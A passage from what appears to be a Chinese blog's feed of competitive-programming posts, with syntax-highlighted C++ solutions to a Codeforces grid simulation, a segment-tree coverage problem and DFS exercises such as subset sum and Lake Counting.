class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            b.<span class="hljs-built_in">push_back</span>(c);<br>            c.<span class="hljs-built_in">clear</span>();<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            b.<span class="hljs-built_in">push_back</span>(c);<br>            c.<span class="hljs-built_in">clear</span>();<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            b.<span class="hljs-built_in">push_back</span>(c);<br>            c.<span class="hljs-built_in">clear</span>();<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j);<br>            c.<span class="hljs-built_in">push_back</span>(i);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>            b.<span class="hljs-built_in">push_back</span>(c);<br>        &#125;<br> <br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">case1</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp;b , vector&lt;string&gt;&amp; a , <span class="hljs-type">int</span> i , <span class="hljs-type">int</span> j)</span></span>&#123;<br>            vector&lt;<span class="hljs-type">int</span>&gt;c;<br>            <span class="hljs-keyword">if</span>(a[i][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i+<span class="hljs-number">1</span>][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">case2</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp;b , vector&lt;string&gt;&amp; a , <span class="hljs-type">int</span> i , <span class="hljs-type">int</span> j)</span></span>&#123;<br>            vector&lt;<span class="hljs-type">int</span>&gt;c;<br>            <span class="hljs-keyword">if</span>(a[i][j]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i][j]=a[i][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i][j]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i+<span class="hljs-number">1</span>][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i][j]=a[i+<span class="hljs-number">1</span>][j]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i][j]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i][j]=a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i+<span class="hljs-number">1</span>][j]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i+<span class="hljs-number">1</span>][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i][j+<span class="hljs-number">1</span>]=a[i+<span class="hljs-number">1</span>][j]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i][j]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i][j+<span class="hljs-number">1</span>]=a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i][j]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i+<span class="hljs-number">1</span>][j]==<span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                c.<span class="hljs-built_in">push_back</span>(i);<br>                c.<span class="hljs-built_in">push_back</span>(j);<br>                b.<span class="hljs-built_in">push_back</span>(c);<br>                a[i+<span class="hljs-number">1</span>][j]=a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                a[i][j]=<span class="hljs-string">&#x27;1&#x27;</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-type">int</span> n,m;<br>            cin&gt;&gt;n&gt;&gt;m;<br>            vector&lt;string&gt;<span class="hljs-built_in">a</span>(n);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>                cin&gt;&gt;a[i];<br>            &#125;<br>            vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;b;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m<span class="hljs-number">-1</span>;j++)&#123;<br>                    <span class="hljs-type">int</span> total=<span class="hljs-number">0</span>;<br>                    total=(a[i][j]-<span class="hljs-string">&#x27;0&#x27;</span>)+(a[i][j+<span class="hljs-number">1</span>]-<span class="hljs-string">&#x27;0&#x27;</span>)+(a[i+<span class="hljs-number">1</span>][j]-<span class="hljs-string">&#x27;0&#x27;</span>)+(a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]-<span class="hljs-string">&#x27;0&#x27;</span>);<br>                    <span class="hljs-keyword">if</span>(total==<span class="hljs-number">0</span>)<br>                        <span class="hljs-keyword">continue</span>;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(total==<span class="hljs-number">3</span>)&#123;<br>                        vector&lt;<span class="hljs-type">int</span>&gt;c;<br>                        <span class="hljs-keyword">if</span>(a[i][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                            a[i][j]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                            c.<span class="hljs-built_in">push_back</span>(i);<br>                            c.<span class="hljs-built_in">push_back</span>(j);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(a[i][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                            a[i][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                            c.<span class="hljs-built_in">push_back</span>(i);<br>                            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(a[i+<span class="hljs-number">1</span>][j]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                            a[i+<span class="hljs-number">1</span>][j]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                            c.<span class="hljs-built_in">push_back</span>(j);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>                            a[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;0&#x27;</span>;<br>                            c.<span class="hljs-built_in">push_back</span>(i+<span class="hljs-number">1</span>);<br>                            c.<span class="hljs-built_in">push_back</span>(j+<span class="hljs-number">1</span>);<br>                        &#125;<br>                        b.<span class="hljs-built_in">push_back</span>(c);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(total==<span class="hljs-number">4</span>)&#123;<br>                        <span class="hljs-built_in">case4</span>(b,a,i,j);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(total==<span class="hljs-number">1</span>)&#123;<br>                        <span class="hljs-built_in">case1</span>(b,a,i,j);<br>                        <span class="hljs-built_in">case4</span>(b,a,i,j);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-built_in">case2</span>(b,a,i,j);<br>                        <span class="hljs-built_in">case1</span>(b,a,i,j);<br>                        <span class="hljs-built_in">case4</span>(b,a,i,j);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            cout&lt;&lt;(<span class="hljs-type">int</span>)b.<span class="hljs-built_in">size</span>()&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(<span class="hljs-type">int</span>)b.<span class="hljs-built_in">size</span>();i++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">6</span>;j++)<br>                    cout&lt;&lt;b[i][j]+<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>                cout&lt;&lt;<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>            <span class="hljs-type">int</span> T;<br>            cin&gt;&gt;T;<br>            <span class="hljs-keyword">while</span>(T--)<br>            &#123;<br>                <span class="hljs-built_in">solve</span>();<br>            &#125;<br>            <span class="hljs-keyword">return</span>  <span class="hljs-number">0</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>PS.这个模拟把人写傻了</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十六届蓝桥杯-JavaA组T.H奇偶覆盖</title>
      <link href="/2020/11/72bd2125.html"/>
      <url>/2020/11/72bd2125.html</url>
      
        <content type="html"><![CDATA[<p>线段树初步版本，未完善</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> l,r,h;<br>    <span class="hljs-type">bool</span> operator&lt; (<span class="hljs-type">const</span> node&amp; a)<span class="hljs-type">const</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> h&lt;a.h;<br>    &#125;<br>&#125;e[N*<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> a[N*<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sum[N*<span class="hljs-number">2</span>*<span class="hljs-number">4</span>],flag[N*<span class="hljs-number">2</span>*<span class="hljs-number">4</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cal</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root)</span><br>&#123;<br>    sum[root]=(a[r]-a[l])-sum[root];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pushup</span><span class="hljs-params">(<span class="hljs-type">int</span> root)</span><br>&#123;<br>    sum[root]=sum[root&lt;&lt;<span class="hljs-number">1</span>]+sum[root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pushdown</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!flag[root])<br>        <span class="hljs-keyword">return</span> ;<br>    flag[root&lt;&lt;<span class="hljs-number">1</span>]^=<span class="hljs-number">1</span>;<br>    flag[root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>]^=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    cal(l,mid,root&lt;&lt;<span class="hljs-number">1</span>);<br>    cal(mid,r,root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>);<br>    flag[root]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r,<span class="hljs-type">int</span> root,<span class="hljs-type">int</span> ql,<span class="hljs-type">int</span> qr)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=ql&amp;&amp;r&lt;=qr)<br>    &#123;<br>        cal(l,r,root);<br>        flag[root]^=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br>    pushdown(l,r,root);<br>    <span class="hljs-type">int</span> mid=l+r&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(mid&gt;ql)<br>        update(l,mid,root&lt;&lt;<span class="hljs-number">1</span>,ql,qr);<br>    <span class="hljs-keyword">if</span>(mid&lt;qr)<br>        update(mid,r,root&lt;&lt;<span class="hljs-number">1</span>|<span class="hljs-number">1</span>,ql,qr);<br>    pushup(root);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-type">int</span> x1,x2,y1,y2,all=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d%d&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].l=min(x1,x2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].r=max(x1,x2);<br>        e[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>].h=min(y1,y2);<br>        e[<span class="hljs-number">2</span>*i].l=min(x1,x2);<br>        e[<span class="hljs-number">2</span>*i].r=max(x1,x2);<br>        e[<span class="hljs-number">2</span>*i].h=max(y1,y2);<br>        a[<span class="hljs-number">2</span>*i<span class="hljs-number">-1</span>]=x1,a[<span class="hljs-number">2</span>*i]=x2;<br>    &#125;<br>    sort(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+n*<span class="hljs-number">2</span>);<br>    all=unique(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+n*<span class="hljs-number">2</span>)-a<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">2</span>*n;i++)<br>        e[i].l=lower_bound(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+all,e[i].l)-a,e[i].r=lower_bound(a+<span class="hljs-number">1</span>,a+<span class="hljs-number">1</span>+all,e[i].r)-a;<br>    sort(e+<span class="hljs-number">1</span>,e+<span class="hljs-number">1</span>+<span class="hljs-number">2</span>*n);<br>    ll ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">2</span>*n;i++)<br>    &#123;<br>        ans+=sum[<span class="hljs-number">1</span>]*(e[i].h-e[i<span class="hljs-number">-1</span>].h);<br>        update(<span class="hljs-number">1</span>,all,<span class="hljs-number">1</span>,e[i].l,e[i].r);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>,ans);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-DFS-Practice</title>
      <link href="/2020/11/7a871ff6.html"/>
      <url>/2020/11/7a871ff6.html</url>
      
        <content type="html"><![CDATA[<h1 id="部分和问题"><a href="#部分和问题" class="headerlink" title="部分和问题"></a>部分和问题</h1><blockquote><p>给定整数a1,a2…,an,判断是否可以从中选出若干数，使他们的和恰好为k</p></blockquote><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">20</span> + <span class="hljs-number">5</span>;<br><br><span class="hljs-type">int</span> a[maxn],n,k;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> i,<span class="hljs-type">int</span> sum)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(i==n)    <span class="hljs-keyword">return</span> sum == k;<br>    <span class="hljs-keyword">if</span>(dfs(i+<span class="hljs-number">1</span>, sum))   <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span>(dfs(i+<span class="hljs-number">1</span>, sum+a[i]))  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>    &#125;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;k;<br>    <span class="hljs-keyword">if</span>(dfs(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))    <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Lake-Counting-POJ2386"><a href="#Lake-Counting-POJ2386" class="headerlink" title="Lake Counting(POJ2386)"></a>Lake Counting(POJ2386)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">100</span> + <span class="hljs-number">5</span>;<br><br><span class="hljs-type">int</span> N,M;<br><span class="hljs-type">char</span> f[maxn][maxn];<br><br><span class="hljs-type">void</span> <span class="hljs-title 